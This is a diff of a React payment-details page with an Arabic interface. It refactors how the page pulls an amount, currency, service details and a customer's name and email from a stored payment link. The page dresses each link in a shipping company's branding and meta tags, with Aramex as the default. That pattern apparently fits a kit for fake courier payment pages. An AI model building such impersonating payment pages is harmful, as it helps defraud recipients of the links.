@@ -8,49 +8,33 @@ import { useLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
 import { getCompanyMeta } from "@/utils/companyMeta";
+import { getPaymentData } from "@/utils/paymentData";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
-import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, User } from "lucide-react";
+import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, User, Heart, Building2, Home } from "lucide-react";
 
 const PaymentDetails = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { data: linkData } = useLink(id);
 
+  // Extract all payment data dynamically
+  const paymentInfo = getPaymentData(linkData);
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
-  const serviceName = linkData?.payload?.service_name || "دفع فاتورة";
+  const serviceName = paymentInfo.serviceName;
   const branding = getServiceBranding(serviceKey);
   const companyMeta = getCompanyMeta(serviceKey);
   const shippingInfo = linkData?.payload as any;
+  const paymentData = shippingInfo?.payment_data;
 
   // Get hero image from branding
   const heroImage = branding.heroImage || "/assets/hero-bg.jpg";
 
-  // Get country code from link data
-  const countryCode = shippingInfo?.selectedCountry || "SA";
-
-  // Get currency info for display
+  // Get country code and currency
+  const countryCode = paymentInfo.currency;
   const currencyInfo = getCurrencyByCountry(countryCode);
 
-  // Get payment data from link data
-  const paymentData = shippingInfo?.payment_data;
-
-  // Get amount from payment data or shipping info
-  const rawAmount = paymentData?.payment_amount || shippingInfo?.cod_amount || shippingInfo?.payment_amount;
-
-  // Handle different data types and edge cases
-  let amount = 500; // Default value
-  if (rawAmount !== undefined && rawAmount !== null) {
-    if (typeof rawAmount === 'number') {
-      amount = rawAmount;
-    } else if (typeof rawAmount === 'string') {
-      const parsed = parseFloat(rawAmount);
-      if (!isNaN(parsed)) {
-        amount = parsed;
-      }
-    }
-  }
-
-  // Format amount with currency symbol and name
+  // Use dynamic amount and formatting
+  const amount = paymentInfo.amount;
   const formattedAmount = formatCurrency(amount, countryCode);
   
   const handleProceed = () => {
@@ -157,8 +141,8 @@ const PaymentDetails = () => {
                 </div>
               </div>
 
-              {/* Payment Data Display */}
-              {(shippingInfo || paymentData) && (
+              {/* Dynamic Service Details */}
+              {Object.keys(paymentInfo.details).length > 0 && (
                 <div 
                   className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg"
                   style={{
@@ -173,42 +157,49 @@ const PaymentDetails = () => {
                       fontFamily: branding.fonts.primaryAr
                     }}
                   >
-                    بيانات السداد
+                    تفاصيل الخدمة
                   </h3>
                   <div className="space-y-2 text-xs sm:text-sm">
-                    {paymentData?.customer_name && (
-                      <div className="flex items-center gap-2">
-                        <User className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.textLight }} />
-                        <span style={{ color: branding.colors.textLight }}>الاسم:</span>
-                        <span className="font-semibold" style={{ color: branding.colors.text }}>{paymentData.customer_name}</span>
+                    {Object.entries(paymentInfo.details).map(([label, value]) => (
+                      <div key={label} className="flex items-center gap-2">
+                        <Hash className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.textLight }} />
+                        <span style={{ color: branding.colors.textLight }}>{label}:</span>
+                        <span className="font-semibold" style={{ color: branding.colors.text }}>{value}</span>
                       </div>
-                    )}
-                    {paymentData?.invoice_number && (
+                    ))}
+                  </div>
+                </div>
+              )}
+
+              {/* Customer Data if available */}
+              {paymentData?.customer_name && (
+                <div 
+                  className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg"
+                  style={{
+                    backgroundColor: branding.colors.surface,
+                    borderRadius: branding.borderRadius.md
+                  }}
+                >
+                  <h3 
+                    className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base"
+                    style={{
+                      color: branding.colors.text,
+                      fontFamily: branding.fonts.primaryAr
+                    }}
+                  >
+                    بيانات العميل
+                  </h3>
+                  <div className="space-y-2 text-xs sm:text-sm">
+                    <div className="flex items-center gap-2">
+                      <User className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.textLight }} />
+                      <span style={{ color: branding.colors.textLight }}>الاسم:</span>
+                      <span className="font-semibold" style={{ color: branding.colors.text }}>{paymentData.customer_name}</span>
+                    </div>
+                    {paymentData.customer_email && (
                       <div className="flex items-center gap-2">
                         <Hash className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.textLight }} />
-                        <span style={{ color: branding.colors.textLight }}>الرقم المفوتر:</span>
-                        <span className="font-semibold" style={{ color: branding.colors.text }}>{paymentData.invoice_number}</span>
-                      </div>
-                    )}
-                    {paymentData?.selected_service_name && (
-                      <div className="flex items-center gap-2">
-                        <Truck className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.textLight }} />
-                        <span style={{ color: branding.colors.textLight }}>الخدمة:</span>
-                        <span className="font-semibold" style={{ color: branding.colors.text }}>{paymentData.selected_service_name}</span>
-                      </div>
-                    )}
-                    {shippingInfo?.tracking_number && (
-                      <div className="flex items-center gap-2">
-                        <Hash className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.textLight }} />
-                        <span style={{ color: branding.colors.textLight }}>رقم الشحنة:</span>
-                        <span className="font-semibold" style={{ color: branding.colors.text }}>{shippingInfo.tracking_number}</span>
-                      </div>
-                    )}
-                    {shippingInfo?.package_description && (
-                      <div className="flex items-center gap-2">
-                        <Package className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.textLight }} />
-                        <span style={{ color: branding.colors.textLight }}>وصف الطرد:</span>
-                        <span className="font-semibold" style={{ color: branding.colors.text }}>{shippingInfo.package_description}</span>
+                        <span style={{ color: branding.colors.textLight }}>البريد:</span>
+                        <span className="font-semibold" style={{ color: branding.colors.text }}>{paymentData.customer_email}</span>
                       </div>
                     )}
                   </div>
